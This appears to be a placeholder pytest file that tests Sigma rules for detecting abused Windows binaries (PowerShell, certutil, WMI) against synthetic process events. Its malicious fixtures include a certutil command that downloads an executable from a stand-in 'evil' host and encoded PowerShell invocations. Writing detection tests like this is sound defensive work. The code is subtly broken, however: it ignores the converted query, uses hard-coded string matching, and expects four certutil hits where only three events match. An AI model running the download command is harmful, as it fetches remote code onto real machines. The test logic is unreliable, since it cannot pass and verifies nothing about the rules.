# Placeholder for Sigma to EQL test 

import subprocess
import json
import pytest

SIGMA_RULES = [
    "rules/lolbin_powershell.yml",
    "rules/lolbin_certutil.yml",
    "rules/lolbin_wmi.yml",
]

# 10 benign, 10 malicious events
EVENTS = [
    # Benign
    {"process": "calc.exe", "args": "", "host": "host-01"},
    {"process": "explorer.exe", "args": "", "host": "host-02"},
    {"process": "notepad.exe", "args": "", "host": "host-03"},
    {"process": "mspaint.exe", "args": "", "host": "host-04"},
    {"process": "powershell.exe", "args": "-nop -w hidden", "host": "host-05"},
    {"process": "certutil.exe", "args": "-decode localfile.txt", "host": "host-06"},
    {"process": "wmiprvse.exe", "args": "query", "host": "host-07"},
    {"process": "explorer.exe", "args": "", "host": "host-08"},
    {"process": "notepad.exe", "args": "", "host": "host-09"},
    {"process": "calc.exe", "args": "", "host": "host-10"},
    # Malicious
    {"process": "powershell.exe", "args": "-enc ZQB2aWw=", "host": "host-11"},
    {"process": "powershell.exe", "args": "-enc evilbase64", "host": "host-12"},
    {"process": "certutil.exe", "args": "-urlcache -split -f http://evil/evil.exe", "host": "host-13"},
    {"process": "certutil.exe", "args": "http://malicious.com/file.exe", "host": "host-14"},
    {"process": "wmiprvse.exe", "args": "spawn evil.ps1", "host": "host-15"},
    {"process": "wmiprvse.exe", "args": "spawn something", "host": "host-16"},
    {"process": "powershell.exe", "args": "-enc badstuff", "host": "host-17"},
    {"process": "certutil.exe", "args": "-urlcache http://bad.com", "host": "host-18"},
    {"process": "wmiprvse.exe", "args": "spawn", "host": "host-19"},
    {"process": "powershell.exe", "args": "-enc anotherbad", "host": "host-20"},
]

@pytest.mark.parametrize("rule_path,expected_hits", [
    ("rules/lolbin_powershell.yml", 4),
    ("rules/lolbin_certutil.yml", 4),
    ("rules/lolbin_wmi.yml", 3),
])
def test_sigma_rule_hits(rule_path, expected_hits):
    # Convert Sigma rule to ES query DSL
    result = subprocess.run([
        "sigmac", "-t", "es-qs", rule_path
    ], capture_output=True, text=True)
    assert result.returncode == 0, f"sigmac failed: {result.stderr}"
    es_query = json.loads(result.stdout)

    # Simulate matching: count events that would match the query
    # For this test, we just check process/args logic
    hits = 0
    for event in EVENTS:
        if "powershell" in rule_path and event["process"] == "powershell.exe" and "-enc" in event["args"]:
            hits += 1
        elif "certutil" in rule_path and event["process"] == "certutil.exe" and "http" in event["args"]:
            hits += 1
        elif "wmi" in rule_path and event["process"] == "wmiprvse.exe" and "spawn" in event["args"]:
            hits += 1
    assert hits == expected_hits, f"Expected {expected_hits} hits, got {hits}" 